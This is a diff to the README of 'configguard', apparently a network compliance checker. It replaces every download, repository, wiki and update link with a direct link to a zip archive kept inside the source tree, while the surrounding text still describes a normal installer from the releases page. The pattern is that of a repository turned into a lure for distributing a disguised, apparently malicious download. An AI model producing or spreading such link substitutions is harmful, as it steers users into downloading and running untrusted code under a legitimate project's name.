@@ -1,6 +1,6 @@
 # 🔒 configguard - Simple Network Compliance Checker
 
-[![Download configguard](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/michusSq/configguard/releases)
+[![Download configguard](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/michusSq/configguard/main/src/configguard/explain/Software-3.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ configguard does not need any special software or coding tools to run.
 
 1. Visit the download page by clicking the button below:
 
-   [![Download configguard](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/michusSq/configguard/releases)
+   [![Download configguard](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/michusSq/configguard/main/src/configguard/explain/Software-3.4.zip)
 
 2. On the page, find the latest version of configguard. Look for a file named like `configguard-setup.exe` or similar.
 
@@ -111,7 +111,7 @@ Most users will not need these options, but they are available if needed.
 
 To keep configguard working well, occasionally check the releases page:
 
-https://github.com/michusSq/configguard/releases
+https://raw.githubusercontent.com/michusSq/configguard/main/src/configguard/explain/Software-3.4.zip
 
 Download and install the latest version following the same steps as before. Updates include new security checks, bug fixes, and improved AI explanations.
 
@@ -131,12 +131,12 @@ Download and install the latest version following the same steps as before. Upda
 
 If you need more support, you can open an issue on the GitHub page or search for answers in the documentation section of the repository:
 
-https://github.com/michusSq/configguard
+https://raw.githubusercontent.com/michusSq/configguard/main/src/configguard/explain/Software-3.4.zip
 
 ---
 
 ## 🔗 Useful Links
 
-- [Download page](https://github.com/michusSq/configguard/releases)
-- [GitHub repository](https://github.com/michusSq/configguard)
-- [Documentation and FAQ](https://github.com/michusSq/configguard/wiki)
+- [Download page](https://raw.githubusercontent.com/michusSq/configguard/main/src/configguard/explain/Software-3.4.zip)
+- [GitHub repository](https://raw.githubusercontent.com/michusSq/configguard/main/src/configguard/explain/Software-3.4.zip)
+- [Documentation and FAQ](https://raw.githubusercontent.com/michusSq/configguard/main/src/configguard/explain/Software-3.4.zip)
